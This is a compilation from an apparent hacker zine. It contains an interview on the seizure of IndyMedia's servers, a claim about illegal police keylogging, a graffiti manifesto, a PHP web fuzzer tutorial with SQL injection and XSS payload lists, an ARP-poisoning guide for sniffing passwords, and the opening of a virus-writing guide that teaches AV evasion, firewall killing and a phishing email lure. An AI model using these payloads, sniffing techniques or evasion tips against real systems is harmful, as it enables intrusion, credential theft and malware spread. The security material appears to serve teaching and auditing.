UK: I think they are because it was the way the manuveur was pulled. We
effectively never wet through anywhere nearthe UK system. If it went through the
UK system it would be a long drawn out case there would have been pros and cons
we would have had our day in court. But because they went through a backdoor in
the US system - a loophole - it went past our security. 

Gary: That the British were happy to allow?

UK: I don't think the Brits had a whole lot to do with it. From our
understanding Rackspace employees went into the server room yanked the servers.

Jeremy: They were originally were looking for a flat log file and the company
just said "I'm not gonna mess with this!" and gave up the entire server?

UK: As I understand it, yes

Jeremy: And there were a lot of other various websites and collectives on the
server?

UK: Oh yes, there was everything from linux distros, to various indymedias,
personal sites - yeah, it hit a lot.

Gary: I would assume this is a violation Rackspace's contract with IndyMedia
entities that have signed it?

UK: Unfortunately the contract was with a single individual. Yes, there probably
was a contract violation there, but as I said, because it never touched UK
authorities, to drag it through the UK system there would be no point of - the
case would fall apart. Because it was in the US the case there was a actual case
in the US going on, there is a lot easier to focus on.

Jeremy: Knowing what you know now about the corporate host and how they were so
quick to give up everything and set back these various collectives, how would
you configure or structure these servers to make the system as a whole less
liable?

UK: Well it's very interesting and actually very simple. We drew a great big
circle around the biggest weakness: we had one server, we now have twelve.

[laughter]

UK: The content management system we use is very good, it's designed for
mirroring. We've basically taken advatage of the way the CMS system was designed
and used it to our advantage. The dynamics are the site are actually done from
the publish server and then the servers actually show the data. 

Jeremy: So when you actually post something to UK IndyMedia it is actually
mirrored to other servers all over the world?

UK: And a variety of different operating systems. Our personal server w3.org is
a Solaris box. Others run debian, freebsd, fedora core - we have a nice
contingent of OSs so if a vulnerability breaks out - unless it's somethig inside
the publishing system itself - we should have a reasonable amount of resiliance.

Jeremy: This seems like a perfect example of how a decentralized model of
content distribution can protect ourselves from not only legal subpoenas because
it creates a aura of bureaucracy the courts have to go through but protect
ourselves from would-be hackers ...

UK: Yes, definitely.

Gary: In an era of extrajudition proceedings where the authorities think they
can do anything they want and just present us with facts despite legal
protections that clearly exist in this case and were violated, I think you have
to use technology to negate the fact that authorities think they are above the
law.

UK: Precisely, it's not the first case and it's not the last. There's things
happening at the moment, servers taken all the time, it's a growing problem,
indymedia needs to be aware of that and try to survive it.

Jeremy: How are people within hacking and programming communities stepped up to
support the project?

UK: In the last 3-4 months we started to put together as security team to go
through each of the servers, each of the code bases, and work for them look for
the weaknesses. I think historically IndyMedia has been pretty lax about that,
more interested with people being able to publish freely and not quite so much
about the security of their systems in which the puiblising occurs, That's
changing, very quickly.

Jeremy: That brings me back to a couple months ago - there had been two major
vulnerabilities - one happened during the RNC with the cross site scripting
error in dadaIMC - a group calling itself RightWingExtremist.net made use of
this during the RNC by changing many indymedia sites to redirect to a site that
said 'indymedia is anti-american' or something crazy! [killing communists!]

UK: The system we're using in the UK is very resiliant, it's java written, the
guy's done a good job we haven't seen too many problems 

Jeremy: Which one are you using?

UK: We're using Mir, it's been pretty responsive.

Jeremy: I believe DadaIMC had had the most problems ..

UK: Yeah, Dada has had a clear history of problems, I agree

Jeremy: A few months ago I had spoken to Spud regarding a vulnerability I
discovered DadaIMC regarding uploading and excecuting PHP files. We privately
notified them of this vulnerability and said, "listen we need to keep this quiet
until each independent IMC staff is privatley notified and update it. Of course
it's a big job and it's not something that'll happen overnight!

UK: One thing I will say while I've got the opportunity is that there is a
private list for IMC techies. It's a fairly rigorous process to get in there,
but if anyone finds an issue, dump it straight to the people who can deal with
it imc-security@lists.indymedia.org is the place to dump in. The technies in
there have a web of trust where you can't get in unless two other people vouch
for you.

Jeremy: How do you think right-wing hackers and script kiddies have made use of
the open disclosure policy of dadaimc?

UK: I can't really talk much about that unfortunately it's not something I have
been involved with. Certainly people we're working with are going through
dadaimc line by line. 

Jeremy: How can hackers play a more integral role in the development and
protection of this software?

UK: I think the trick is really just to get involved. To get to the point of
where you're a member of the trusted team takes a little bit of work, but
there's nothing to stop people..

Jeremy: Yeah, cause they can still just download the source and just start
auditing.

UK: Yeah, but one thing we don't want happening this has happened once already .
We had a guy portscanned all 13 of the UK mirrors. Now in a sense he found
things we knew about, but on the other hand we don't want to encourage people to
start scanning our boxes because it generates extra processes - we'd be far
happier for people to work with us and communicate with us about what they're
doing this knd of thing- if anything so we don't block them.

Jeremy: I had personally installed it on localhost. How can hackers and civil
rights activists collaborate and work together in order to help pressure the law
and help take the battle to the courts?

UK: I think the biggest thing is to get hackers to understand the issues.
Hackers at the end of the day don't break things. It doesn't take much to see
the political ramifactions of their actions. The only time you really think talk
it as a community is when - the cisco case, something happens, something get
pulled, someone shits in their pants, but nobody takes the interest over a long
term basis. That's frustrating and it needs to change. What the Hack another con
in Europe right now, their talk list is a lot more encompassing, they spend some
time with other issues than security per say, like the DMCA, counter-terrorism,
they think behind the box, and as a hacker community, we all need to do that.

Jeremy: I would certainly agree of your critique, especially of DEFCON, this
seems more like a white hat drunken party, there's not as much teaching here,
only 10% of the people here are maybe hackers anyway, everyone else came here
for the culture, the sideshow. How do you think things have changed over the
past few years in light of some of the new policies and anti-terrorism
legislation? How do you think the hacking community has changed, become more
radicalized?

UK: I think the UK and Europe is certainly starting to pick up this. However,
unlike America where you have a huge great community, Europe doesn't have that,
that's one of the things that is being worked on right now, like the European
constitution, declaration of human rights, that kind of thing. We need to
involved. The people in the ground need to get it done and push it. We've had a
lot of success recently and we need to learn from it.. If European hackers can
bond together, we can stop bad legislation, but we need to pull together. All
too frequently this hasn't happened.

Jeremy: I'm looking at past conventions like Hackers on Planet Earth that
happened last summer. It was held in New York City a month before the Republican
National Convention, so naturally it was a lot more politically charged. I
thought it was a lot more independent, more genuine, talking about hacker rights
and digital rights and how we can protect systems such as IndyMedia - I believe
they actually had an IndyMedia speech and several other political speeches...

UK: What the Hack was the same way. Italian government agents went in and
sniffed the wire effectively and the ISP told IndyMedia it was a power outage.
But yeah, it's bound to happen.

Alxciada: How long ago were your servers actually taken?

UK: Trying to think, I believe it was last June

Jeremy: What do you think about the raid that happened about a month ago in
Bristol?

UK: That's even worse and that's one of those things that are a real issue.
Indymedia needs to move toward encryption circuits and publishing stuff so you
can't tie back to who precisely posted what. The Italian case - my awareness
that is they didn't realize how content is distributed.

Jeremy: What were the circumstances behind the Bristol server being seized? Were
they also looking for server logs?

UK: Yeah, that was a case where a radical collective did some direct action
destroyed some property and police became involved. My understanding is that
someone from IndyMedia tipped off the police. 

Jeremy: So they broke concensus with the larger group, went directly to the
police, and that caused the server as a whole to be seized?

UK: Yeah, and that was hosted in someone's house as well, so they came into
their place.

Alxciada: Did they have any mirrors?

UK: They had another backup but it wasn't actively updated. It is very difficult
to get a hold of someone with the Bristol project. The server was in Texas and
it is difficult to actually switch over the backups. 

Jeremy: The seizure in Bristol happened about a week before the G8
demonstrations?

UK: Yeah, Bristol is fairly seperate collective of the UK, and they hadn't
learned the lessons UK IndyMedia have, which is a shame.

Jeremy: What do you have to say to people who are just beginning to get
involved, just starting to understand these issues. What would be the most
effective way to educating themselves as well as plugging in with various
collectives and people who are involved to take a more active role?

UK: The biggest thing is to just sit down and start reading IndyMedia, working
out how IndyMedia functions, how the global groups decide things effectively.
Then come find us - we are there!

Jeremy: Great! I thought this was very productive. Anything else you'd like to
say?

Gary: I'd like to say one thing. Thank YOU for putting yourself and your
property at risk for the free exchange of digital information because your a
hero and you're putting everything on the line - there's nothing to say that
they won't be busting down your door next. So I admire you for it and more power
to you. It takes a hundred heros like you to keep this movement alive.

UK: There are many of us - in places people wouldn't expect to find us either!

[ misadventures of irish hackers ........................................... C ]
[------------------------------------------------------------------------------]

At the first ever Northern Ireland Computer Security Enthusiast Convention
(NICSE CON) held in the Europa Hotel Belfast saw the amalgamation of 87 hackers,
14 Computer Science Professors, 19 System Administrators, and 4 Police Officers,
All with the common goal to seek and learn new security Information. 

The Con held many activities such as 
Capture The Flag ( Fedora Systems Used) 
Hack the Hotel ( A successful bid to take over the Hotels Internal IT system) 
The Hammond Files ( An in-depth Discussion into his situation) 
Hackthissite – ( Discussion into Origins, success’s , Failures ) 
Presentations on Bluetooth Hacking
Presentations on the Northern Ireland Hackers ( Growth, Skills ) 

All in all it was a fantastic day, however as most of you DNScon and DEFCON
goers know, the real stuff doesn’t happen until the con is over and people start
to talk. 

As I was one of the organisers, I was getting a lot of people coming up to me
talking about different things. However one man in particular caught my
attention; he said he was a Police Officer working in the Computer Sides of
things – Forensics, Stings etc. So I immediately offered him to come join the
other organisers and myself for the usual post-con pint of Guinness.

As usual the topic of Politics came up, and obviously his views were more than
interesting due to his occupation. Progressively we turned the conversation
around to the IRA (Army sworn to keep Ireland Free from British Soldiers and to
create a united Ireland). The officer started to talk about his involvement in
certain operations against the IRA (Strictly of the Record of Course:-P). 

One of the operations he only heard about was the tapping of the Sinn Fein
Office (Sinn Fein the political Wing of the IRA). When Sinn Fein left their
offices at night, the Special Agents would break into the offices and plant tiny
little bugging devices so they could hear the Sinn Fein Leaders speak. Not only
was this not authorised but also HIGHLY illegal. 

(picture)

This is part of a British MI5/PSNI bugging device found hidden in the
floorboards of a Sinn Fein office in Belfast in September 2004. Approx 10.5
inches by 6.5 inches.
(At this point I may tell you that this officer was totally against all of this
illegal activity from the police, and he knew his consequences of telling us
this information. However reasons not known to us, he told us everything. For
this, we thank you) 

The officer also got us interested by the current case that he was working on at
the time. Operation “Mirror” – This operation called for the officer and a team
of computer Experts within the force to implant Key logging Software onto IRA
suspects as well as Sinn Fein Politicians. This software was implanted by
several methods. By finding computers that the Suspects used and actually
loading the software onto the computer in front of them, or the less than legal
way of inserting this software onto the Suspects and Politicians computer
remotely ( i.e. HACKING). 

The officer told us, that none of this was legal, and none of this was given
permission from the Chief Constable. However the team were told to keep this a
secret. Another interesting point was that the data obtained from the suspects
was used to Black Mail the suspects. They also found Credit Card numbers and ran
illegal checks on their purchases. 

This says a lot about the Northern Ireland Police Service. That they would be as
low as to perform illegal acts in order to Blackmail and incriminate innocent
people. However this isn’t just an isolated case in Northern Ireland, its all
over the world.

[ graffiti and counter-culture ........................ the wooster collective ]
[------------------------------------------------------------------------------]

The graffiti movement is by its very nature a counter-culture,
anti-establishment mindset that is an alternative to the mainstream. It is a
rejection of the status quo.

When you decide that you are going to go up against the establishment, often all
you have is yourself. The only way you can survive is to protect yourself. If
you don't protect yourself, you die. If not literally, then spiritually.
Because you don't have any resources given to you by the mainstream
establishment that you rejected, the only way you can surviive and protect
yourself. The way you do this is to develop your own personal moral code that
allows you to survive in a world that is outside "the norm" It is this code that
drives you. Not money. Not a house with a white picket fence. Only your beliefs.
The code is what gives you piece of mind when things get tough. It's what allows
you to go to jail for your actions and then get right back out there to get up
once again.

It's the code that stops you from going crazy.
So where do you develop this code?
You develop it on the streets.
You learn it from watching and talking to others.
But most importantly, you get it from experiencing life.

And that's why graf culture is so powerful to people who do it. You get to
experience life to the fullest. You are truly alive, risking what you have,
rejecting the establishment, but living your life the way you have defined it.
You have real, true freedom.

As you experience life on the street you begin to pick up experiences like they
were little scraps of paper. And you start to make a collage with the
experiences. You put all of the scraps together and it becomes your own personal
fabric that defines who you are.

You are defined by reality, not by television.
You are defined by experience, not by aspiration.
It's your code and nobody elses. And nobody can take it away from you.
And now, suddenly, you have a weapon.
The code itself becomes your weapon.

Your life is on the street. And there's an order to it. You know where things
are meant to be. Things are where they should belong. Ads go on billboards.
Graffiti goes on walls and doors. The two co-exist. They clash, but they know
where they each should be.

If you're living the life of a true graffiti artist, you're livin' by the code
you have created for yourself.

And what this means is...

Graffiti shouldn't be in ads and ads shouldn't be in graffiti.
Graffiti in an ad is an ad. It's not graffiti.
Graffiti done legally is public art sanctioned by the establishment. It's not
graffiti.

For graffiti to be graffiti, it has to be done illegally.

Period.

                                !!!!!!!!!!!!!!!!
                                !!!  SKILLS  !!!

[ writing a php fuzzer to self-discover web vulnerabilities .................. ]
[ -----------------------------------------------------------------------------]

Fuzzers are tools which can audit code and probe systems for generic
vulnerabilities. For the purpose of this article, we will write several
functions for a PHP script which will fuzz the GET parameters of a URL to
trigger error codes and discover potential vulnerabilities. We will then explore
possibilities of expanding the functionality to become a broader
all-emcompassing web vulnerability auditing tool.

Our web fuzzer works by taking a URL and manipulating each GET variable to make
every possible combination of requests with an array of malicious characters
designed to generate errors. Consider the following array which contains a large
selection of common requests which often generate errors and could open scripts
up to security holes.

// malicious web requests
$vulnchars[0] = array("%00","%2527%252esasdf","%u0000",
"%u5c00%u2700","/","../","./..././","/%2e/", "%2e","%5C","%s", "'","'''''","\"",
"%%%%%%","!!!!!!!!!!!!!!!!!!","#", "%5C27","%%5C%56" , "\'", "\\",';',";a", "|",
"\?>", "%a0");
// malicious sql requests
$vulnchars[1] = array(" OR 1=1", "' OR '!'='!");
// malicious xss requests  
$vulnchars[2] = array("javascript:alert(String.fromCharCode(65,66,67))",
"<script>alert('cookies, yo: ' + document.cookie);</script>");

We would then make all possible combinations of web requests and analyze the
output. Scan the results for an array of common error code output and generate a
list of 'flagged' URLs to be later reviewed for auditing purposes. We have put
together the following array which contains a list of common web, sql, and xss
errors.

$flags[0] = array("<b>warning</b>:", "warning:", "<b>fatal error</b>", "failed
to open stream:", "internal server error", "there was an error when processing
this directive.", "http/1.1 400", "http/1.1 403", "http/1.1 500", "gateway
error", "command not found", "file not found");
$flags[1] = array("[obdc", "mysql error", "you have an error in your sql
syntax", "odbc drivers error", "[microsoft sql", );
$flags[2] = array("javascript:alert(string.fromcharcode(65,66,67))",
"<script>alert('cookies, yo: ' + document.cookie);</script>");

Now that we know what kind of requests to make and what we should be parsing the
output for, we can write some PHP code which will query the HTTP server for our
requests. In this example, we are only making GET requests, but it can be easily
modified ti include other HTTP methods.

function MakeRequest($url, $method="GET") {
  $url = str_replace(" ", "%20", $url);
  if ($method=="GET") {
    $host = substr($url, strpos($url, "://") + 3);$host=substr($host,
0,strpos($host, "/"));
  $request = substr($url, strpos($host, "/"));

  $fp = @fsockopen($host, 80, $errno, $errstr, 10);
  if (!$fp) {
     echo "    ERROR . $url $errstr ($errno)$newline";
  } else {
     $out  = "GET $request HTTP/1.1\r\n";
     $out .= "Host: $host\r\n";
     $out .= "Connection: Close\r\n\r\n";
     fwrite($fp, $out);
     while (!feof($fp)) {
         $buf.= fgets($fp);
     }
     fclose($fp);
    }
  } 
  return $buf;
}

Now that we can get results from the HTTP server for our malicious requests, we
need to run it through a function to scan it for the error codes listed above.
The following function returns true if the $result has any matches from the
$flags array.

function TestResult ($result) {
  global $flags;
  $result = strtolower($result);
  for ($i=0;$i < count($flags);$i++) {
    for ($o=0;$o < count($flags);$o++) {
      if (!(strpos($result, $flags[$i][$o]) === false)) {
        return 1;
      }
    }
  }
  return 0;
}

Having all the pieces we need, it's time to write some code to tie everything
together. The following code uses the array $lists to contain all URLs to probe.
It first parses the URL for all GET parameters to fuzz and starts a loop to test
all possible combinations of unique URLs. It goes through each GET variable and
tries each malicious character while using the default value of all other GET
parameters. The total number of requests should be around N ^ N for each url in
$list where N is the number of GET parameters in each URL). It then MakesRequest
for each unique URL and passes the results off to TestResult, announcing if a
match against one of the error codes from $flag.

    for ($inc=0;$inc<count($list);$inc++) {
	  if ($localonly == true AND (substr($list[$inc], 0, 17) !=
"http://localhost/" AND substr($list[$inc], 0, 17) != "http://127.0.0.1/"))
die("Sorry, this script can only be tested against localhost.");
	  
	  // SetUpParameters parses and stores each GET paramater from a URL into
the array $get and $getvalues
	  $url = SetUpParameters($list[$inc]);
	  if (trim($url) != "") { 
	  echo "$newline$url$newline";
      // go through each kind of vulnerability we are testing
	  for ($vulni=0;$vulni<count($vulnchars);$vulni++) {
		switch ($vulni) {
		  case 0: echo "  * General web vulnerabilities$newline"; break;
		  case 1: echo "  * SQL vulnerabilities$newline"; break;
		  case 2: echo "  * XSS vulnerabilities$newline"; break;
		}
		// go through each GET parameter in the URL
		for ($o=0;$o < count($get);$o++) {
		  for ($i=0;$i<count($vulnchars[$vulni]);$i++) {
			// generate url from list of vulnerable characters
			$whichparam = $get[$o];
			$testing = $url . "?";
			// put together the default values for all the other parameters in
the script
			for ($z=0;$z<count($get);$z++) {
			  if ($get[$z] != $whichparam)
$testing.="&".$get[$z]."=".$getvalue[$z];
			}
			$testing .= "&" . $whichparam . "=" . $vulnchars[$vulni][$i];
		  
			$fun = MakeRequest($testing);
			if ($parseforlinks == true) ParseForLinks($fun);
			$error = TestResult($fun);
			if ($error != 0) 
			  echo "    FLAG! .. $testing$newline";
	  		if ($error == 0 and $verbose == true)
		  	  echo "    OK    .. $testing $newline";
		    }
		  }
	    }
	  }
	}
	
This code is the bare essentials to writing a web GET request fuzzer. There are
loads of features which can expand this script to be a more encompassing web
auditing tool. For starters, the script can be written to read the output of a
URL and spider it for additional URLs in <a href="http://$host/"> tags to be
added to the $list array. It can also be expanded to include other methods
including POST, SSL, cookies, and file upload vulnerabilities. Writing a web
fuzzer is a rewarding programming exercise where the possibilities are endless.

[ arp poisoning ................................................. by darkangel ]
[----------------------------------------------------------------------------- ]

Introduction
This article is meant to teach how ARP works and how one can go about poisoning
the ARP cache and enable them to completely sniff traffic over a switched
network. This article assumes that you already have access to a switched
network. ARP Poisoning is a way of tricking computers over a switched network to
send traffic through you before going to other computers or out to the internet.

Address Resolution Protocol(ARP)
ARP is a dynamic protocol to map a 32bit IP Address to a 48bit physical hardware
address (MAC Address). If one system over a network wants to communicate with
another system over a network, it will first check if it already knows that
systems MAC Address and if not it will send out an ARP broadcast which will look
for the hardware address of the destination system. There are four types of ARP
messages but the main two are ARP Request and ARP Reply. When a system starts
broadcasting an ARP Message it sends out an ARP Request. An ARP Request is a
message sent to the broadcast address, the message contains the sender's IP
Address and MAC Address and requests the MAC Address of the given IP, and then
it waits for an ARP Reply. An ARP Reply replies to the ARP Request and tells the
computer sending the ARP Request what its MAC Address is. 

The ARP Cache is a temporary storage place that holds a table with MAC Address's
and IP Address's. If a computer wants to talk to another computer and it doesn't
already have its MAC address stored it will send an ARP Request. If the Computer
that is sending the ARP Reply does not have the requesting computers MAC Address
it as well will save it to cache. So now both computers have the MAC Address. A
system cannot communicate with another until it has its MAC Address.

ARP is a stateless protocol with no authentication built in so any ARP Reply,
whether there was a request or not will update the ARP Cache on a computer. All
systems will accept an ARP Reply regardless if there was an ARP Request sent.

The Switch
Media Access Control (MAC) is a standard addressing system for all Ethernet
devices. Most networks use switching devices and in a switched network packets
are only sent to the port they are destined to according to their destination
MAC Address. Switches maintain a table that associates MAC Address's with
certain ports. A switch constructs a route table by extracting the source MAC
Address from the Ethernet frame of each packet processed. If any entry in the
route table does not exist the switch will forward the packet out all of its
ports. 

Within a switched network packets are only sent to the destination device making
it, so other devices cannot see the traffic.

Poisoning
There are a few tricks to manipulating a network to send traffic through you
before sending it to the packets to the destination device. One of these methods
is referred to as ARP Poisoning and it is when you send a customized ARP Reply
to different computers across the network tricking their computers into updating
their ARP cache with new MAC Address's (Your MAC Address). So now each time
computer1 wants to send a message to computer2 it gets the MAC address of
computer2's IP and sends the message to that MAC address. But if that MAC
address is changed to your MAC address, by poisoning the ARP Cache the message
will be sent to you instead. After packets are sent to you, you must forward the
packets to the computer it was meant to go in the first place or DoS will be
caused and the hosts will not be able to communicate anymore. Another factor
that you must weigh in are timeouts, if there is no traffic over the network,
after a timeout period the ARP cache of the computers across a network will be
flushed out and you will need to send another constructed ARP reply to the hosts
so that traffic is once again forwarded to you.  One way to fix this is to
automatically send ARP Replies every 10 seconds or so to the hosts that you want
to poison.

Sniffing
Sniffing is the act of capturing packets that aren't necessarily meant for
public viewings. When you sniff packets across a network you can come across
many interesting things such as emails, instant messages, and even passwords to
email accounts and ftp accounts and many other types of passwords which in my
experience are more often than not, left unencrypted. There are many tools out
there that will automatically scan packets for username and password info. You
can also see what websites the person is going to.

Wireless
If an access point is connected directly to a hub or a switch than it leaves the
entire wireless network open to ARP Poisoning. Wireless internet is becoming
more and more used and it is hard to be anywhere that does not have a wireless
access point, especially in well populated areas. This leaves a huge security
risk to most networks because in theory someone with a laptop could go into the
lobby of a business and get on their network by cracking their WEP key or just
simply connecting if they don't even have WEP. The attacker would then just need
to poison the ARP Cache of the different computers across the network and then
forward all traffic through you. You would get their passwords and usernames,
the websites they go to and anything else that you feel would be fun to look at. 

Tools
Ettercap http://www.ettercap.sourceforge.net 
Allows you to sniff networks and poison the arp and auto redirect traffic
TCP Dump http://www.tcpdump.org/ 
A general purpose packet sniffer
Cain&Able http://www.oxid.it/cain.html

work over wireless and is only for windows. But is very usefull for cracking
passwords that you come across
ARPoison http://arpoison.sourceforge.net/ 
Command line tool for UNIX which sends out spoofed packets
Nemesis http://nemesis.sourceforge.net/
A very good packet injection tool
Dsniff, Arp Redirect http://naughty.monkey.org/~dugsong/dsniff/ 
Will let you intercept packets and get passwords and redirect the traffic, very
good tool

Foreword.

"And God blessed them, saying, Be fruitful, and multiply, and fill the waters in
the seas, and let fowl multiply in the earth."

From the beginning of mankind's existence, they were fascinated with creating
life, another creature, with a "mind" of it's own, a creature that can turn
itself against it's master. I think this is one of the main reasons why the VX
scene exists. Most viruswriters (including me) enjoy the challange of creating a
small life form that "lives" on it's own.

0) Introduction
Well, enough preaching for today. Before I start with technical explainations, I
will first make a few things clear to the really,really new people out there.

0->1) What is a virus?
Well, a better question would be, what is malware? As this umbrellaterm covers
much more than just virii. Malware is the common term for any unwanted program
on your box. It can be divided in several catogories:

I) Virii.
Most people think virii and malware are the same, but that is a common
misassumption. A virus is (in my opinion) best defined as: "A self-replicating
program that abuses other (host) programs in order to spread". A virus always
needs a host program, it cannot spread on it's own, it needs other programs to
infect.

II) Worms.

The main difference between a worm and a virus are the way of replication, a
worm can live without a host, it's like a bacteria, it copies itself and
propagates itself trough many different ways. Unlike a virus, most worms won't
infect other programs.

III) Trojans.

These sneaky little devils derive their name from the ancient greek myth of the
wooden horse of Troje (you know, with Odysseus inventing a trick to get into the
city and coming up with this huge wooden horse which contains the greek
soldiers). Well, today's trojan horses are much like that, they pose like an
innocent or (more often) a very attractive file, but they actually contain a
dangerous payload, either they are disguised worms, virii, spyware, logic bombs,
or RAT's (Remote Administration Tools).

IV) Spyware.

These are the new players in today's cyber-battlefields. Spyware is a term for
any piece of software that monitors the victim's habits, from surfing habits to
chat passwords, to banking passwords to full scale corporate espionage.

V) Logic Bombs.

Quite rare, Logic Bombs are programs that triger when a certain event happens
(or doesn't happen). When you are the victim of a logic bomb, you know that
someone is really after you, because they don't spread in the wild. Logic bombs
are commonly created by disgruntled programmers who didn't receive their
payment, or are afraid they won't receive it. A logic bomb triggers when certain
conditions are met, like a date, or the deletion of a certain file. Imagine a
programmer works somewhere, and he installs a LB that requires him to enter a
password every month, else it will erase the entire box' harddrive. When the
programmer gets fired, he can't enter the password, and the company loses all
the data on the programmer's box.

0->2) Types of malware.

I) Virii.

a) Overwriters, these are quite common in the viral world. They just replace the
hostprogram with themselves, erasing the program.

b) Companions, these virii don't alter the hostfile, they hide them from the
user and rename them, taking their place and executing the host after they are
done.

c) Bootsector virii, these virii infect a HD or floppy bootsector, initiating
themselves at each startup, without user interaction, making them quite
powerfull.

d) Prependers, these virii place their code in front of the victim code,
executing themselves before the victim code can, thus not notifying the victim
of missing files.

e) Appenders, the same as prependers, only they execute after the victim code.

f) Memory-resident, these type of virii use TSR techniques (Terminate and Stay
Resident), to remain in the box' memory (usually by interupt hooking) until
something happens (a .exe file is opened) and then they infect files this way.

g) Encrypted virii, to fool scanners in the old days, virii used to encrypt
their opcode bodies, and decrypted themselves during runtime. This technique has
evolved a long way (see below).

h) Oligomorphic virii, these virii are encrypted virii, who change their
decryption/encryption key at every replication, thus making it harder for a
virus scanner to detect them.

i) Polymorphic virii, a quite advanced technique, these little devils substitute
whole opcode blocks with blocks that look different, but do the same.

j) Metamorphic virii, one of the newest techniques to fool AV's, these virii
replace entire blocks of logic in their bodies. They replace 3 with (1+2) or (6
/ 2) or (((2 * 2) +2) / 2) for example.

k) EPO virii, entry point obscuring (or obfuscating) virii place their code body
somewhere random inside the host's body, and modify the host to jump to the
point where the virus starts, thus forcing AV's to scan entire files, slowing
them down.

l) Cross-infection virii, these virii infect multiple file types, thus
increasing their effectiveness.

m) Cryptovirii, these are relatively rare, encoding entire harddrives with  a
publickey algorithm, and forcing the victim to pay the viruswriter ransommoney
to decode his/her HD (also called Ransomware).

II) Worms.

a) Massmailing, these worms harvest e-mail adresses from a box (either from WAB
files, messenger contact lists or other addressbook files) and mail themselves
to them to propagate, they will travel around the world really quick, but will
attract virusanalyst's attention really quickely too, making them somewhat blasé
(and unsubtle) in my opinion.

b) P2P, these worms spread trough peer-to-peer software, propagating as popular
filenames (music, movies, pictures, programs, etc), these could go nearly as
fast as Massmailers (as long as they make sure they keep propagating as files
that are still popular) and far more silent.

c) I-Worms, Internet worms are a special case, the very first worm, the
morris-worm, was also an internetworm, but it took more than 15 years before the
second I-Worm appeared. I-Worms are often referred to as Warhol-worms, derived
from Warhol's prediction that in the future everybody will be famous for 15
minutes. I-Worms travel by exploiting security gaps, like Morris' sendmail bug.
Code-Red,Nimda, Sasser and Zotob are all Warhol worms (I-worms) and are
extremely successfull.

d) Botnet worms, these worms function a bit as a trojan too. They use the
victim's box as a zombie, allowing the attacker to remotely use the victim's pc
to send spam, log passwords and launch ddos attacks.

e) Neural-Network worms, I have never heard of one seen in the wild, just as a
poc (proof of concept). Often referred to as Curious Yellow worms, these worms
communicate with each other in order to exchange information over possible
victims, new exploits to use to propagate and new anti-antivirus techniques.
These worms could harbor a self-improving/self-rewriting mechanism, making them
virtually invincible. But it would take a group of very experienced A.I.
Scientists to code such a worm.

III) Trojans.

a) R.A.T's

The most popular of trojans, these programs allow an attacker to remotely
control the infected box, gathering sensitive info, or using it to launch ddos
attacks, use it as a tunnel to root other boxes or to anonymously launch new
viral epedemics.

b) Rootkits

I don't know if these can be considered trojans, but they are (in my opinion)
best classified here. Rootkits allow a remote attacker stealthy access to a box,
hiding processes, directories, files and extra accounts.

b) other

Any program, disguising itself as something else, could be considered a trojan.

IV) Spyware

a) Homepage/Searchpage Hijackers

These programs change your homepage and searchpage to a page of the author's
choice.

b) Dialers

Dialers abuse the victim's dialup connection to dial to a very expensive number
somewhere abroad, generating money for the author.

c) Habit-trackers

These programs track your surfing-habits, advertising things you ( according to
your surfing) want.

d) Keyloggers

Could also be classified under trojans. Keyloggers monitor your keystrokes,
stealing your passwords and sending them to a remote attacker for his goals.

V) Logic Bombs

see explanation in 0->1.



1) Abstract concepts

Now we know some basic malware concepts, we can delve further in theory about
malware development.

1->1) Survival Concept

First we need to know what is important for malware to survive. Well, here are
some important things:

I) Spreading

The most important feature of most malware is to spread as far as possible,
infecting a lot of files/boxes.

II) Efficiency

Doing what it is designed for is of course extremely important. For some worms
it would be taking down a website, or for spyware it would be monitoring surfer
habits.

III) Stealth

Not being detected by AV's is crucial in surviving. If malware is detected it
soon becomes unusable and dies.

1->2) Survival Theory

I) Spreading

Spreading can be done in many ways. As described in 0->2, malware can take on
many propagation forms. Very important when spreading is a part of
social-engeneering. Sending a mass-mail like:

----------start of mail---------------------

Subject: dfjadsad

Body: Hi, open the attachment

Attachment: blah.exe

--------end of mail---------------------

wouldn't attact many people. It is boring. A mail like this however:

----------start of mail---------------------

Subject: Your Credit Card has been charged

Body: 
Dear recipient@provider.com,

Your purchase of the $1000 bodyset-deluxe was sucessfull, your credit-card has
been charged accordingly, check
the attachment for details.

Yours sincerly,

The E-Bay team.

Attachment: Details.doc.exe

--------end of mail---------------------

would attract more people, they would be eager to see what has happened to them,
nobody wants to be
charged for something they haven't bought.

This goes for the P2P way too, files like StarWars - Revengeofthesith.avi.exe
spread faster than blah.exe.
Also, most people feel more secure if a file is zipped. Well, including a
zip-component in your malware, to zip it everytime it replicates isn't that
difficult.

II) Efficiency

There always needs to be a delicate balance between spreading,stealth and
efficincy. Spreading like mad will get your malware very far, but it will be
detected in a matter of hours, making it obsolete, while extreme stealth might
keep your malware undetected for years, but it won't infect more than 10 boxes.
Being efficint totally depends on your goals.

III) Stealth

Malware has many enemies, here are some of them:

a) AV's
b) Firewalls
c) AV researchers

fooling AV's isn't too dificult, sometimes switching two or three bytes is
enough to fool them, but your virus will get detected again and all will be for
nope.
So you need to protect your malware from AV's. Thus
encryption,Oligomorphism,Polymorphism and Metamorphism are born. For all
cryptographers out there, let go of the classic idea of encryption, Viral
encryption is something different. Encryption,Polymorphism,Oligomorphism and
Metamorphism for executables is only possible in assembly, so start learning it!

Fooling firewalls can also be done quite easily, just terminate their processes!
Although this is quite rude and unsubtle, it is effective. A more subtle way is
adding your program to their trustedprogram-list.

Fooling an AV researcher can be quite difficult. They will disassemble your
virus, Emulate it's code and Sandbox it. Making your virus extremely complex,
with long loops and jumps will keep them from fully understanding it by
disassembly. Stopping Emulation is quite difficult, you would have to check if
your code is being emulated by making a change, and checking if that change
really has been applied, if not, you are being emulated. Sandboxing is a
tehcnique that involves putting your virus in a virtual machine with some
baitfiles to see what it does. This could be overcome by checking for VMware,
Virtual Pc, etc. I will give details later.

2) Code Practice.

Before starting this section I assume the reader is familiar with standard
programming theory,viral theory and several (script)languages, such as
c++,Pascal,Vbs,Js, batch and some assembler would help too. All assembler source
examples will be in 16-bit assembler, since these are mainly for educational
purposes, their outdated nature will nearly automatically SK-Proof it, however,
anyone familiar with 16/32- bit assembler can convert the examples to suit the
win32 platform.
This section will contain viral code. I am not responsible for any damage done
by any of these programs, nor do I promote releasing them. I have divided the
Code Practice in several sections as follows:

I) Simple Exe Virii
II) Batch Virii
III)Script Virii
IV) Moderate ExeVirii/Worms
V) Concept Virii

[ proxy chaining, tunnelling and tor................. by outthere and kuroishi ]
[ ---------------------------------------------------------------------------- ]

The creation of anonymous networks like Tor based on assymetric key
cryptography and onion routers do make traditional proxy services seem rather
old fashioned, but traditional anonymous proxy services are still quite useful
for IRC, jump boxes, and general internet tomfoolery, despite the threats from
honeypots.

